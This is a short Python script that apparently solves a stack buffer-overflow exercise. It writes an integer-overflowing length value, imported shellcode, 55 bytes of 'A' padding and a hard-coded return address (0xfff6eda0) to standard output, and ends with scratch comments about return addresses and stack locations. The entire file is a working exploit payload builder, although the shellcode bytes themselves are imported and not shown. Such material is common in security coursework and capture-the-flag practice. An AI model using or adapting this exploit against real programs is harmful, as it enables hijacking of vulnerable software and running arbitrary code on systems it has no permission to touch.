from shellcode import shellcode
import sys


n=1073741840
sys.stdout.buffer.write(n.to_bytes(4,byteorder= 'little'))
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'A'*12+b'A'*10+b'A'*33)
sys.stdout.buffer.write(0xfff6eda0.to_bytes(4,byteorder = 'little'))
#print(len(shellcode))
#print(shellcode)

"""
0x08048d4b
read file return address
one uint will take four bytes which is one word.

new start point should be


check this line :0xfff6ee00
"""